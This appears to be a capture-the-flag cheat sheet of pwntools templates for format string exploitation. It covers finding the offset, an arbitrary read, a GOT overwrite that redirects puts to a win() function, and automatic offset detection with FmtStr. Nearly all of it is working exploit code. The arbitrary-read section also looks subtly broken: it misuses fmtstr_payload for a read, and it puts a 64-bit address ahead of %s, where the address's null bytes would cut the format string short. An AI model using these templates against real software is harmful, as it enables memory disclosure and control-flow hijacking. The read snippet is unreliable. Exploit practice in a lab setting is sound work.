# Format String Templates

## Arbitrary Read

```python
from pwn import *

elf = ELF('./challenge')
context.binary = elf

p = process(elf.path)

# Find format string offset (which %p leaks our input)
# Send: AAAA%p.%p.%p.%p.%p.%p.%p.%p
# Look for 0x41414141 in output → that position is the offset

fmt_offset = 6  # Example: our input starts at position 6

# Read from specific address
target_addr = elf.got['puts']
payload = fmtstr_payload(fmt_offset, {target_addr: b''}, write_size='short')

# Or manual read:
payload = p64(target_addr) + f'%{fmt_offset}$s'.encode()
p.sendline(payload)
```

## Arbitrary Write (GOT Overwrite)

```python
from pwn import *

elf = ELF('./challenge')
context.binary = elf

p = process(elf.path)

fmt_offset = 6

# Overwrite puts@GOT with win()
writes = {elf.got['puts']: elf.symbols['win']}
payload = fmtstr_payload(fmt_offset, writes, write_size='short')

p.sendline(payload)
p.interactive()
```

## FmtStr Helper (Interactive)

```python
from pwn import *

elf = ELF('./challenge')
context.binary = elf

def send_payload(payload):
    p = process(elf.path)
    p.sendline(payload)
    return p.recvall()

# Auto-detect format string offset
fmt = FmtStr(execute_fmt=send_payload)
log.info(f'Format string offset: {fmt.offset}')
```
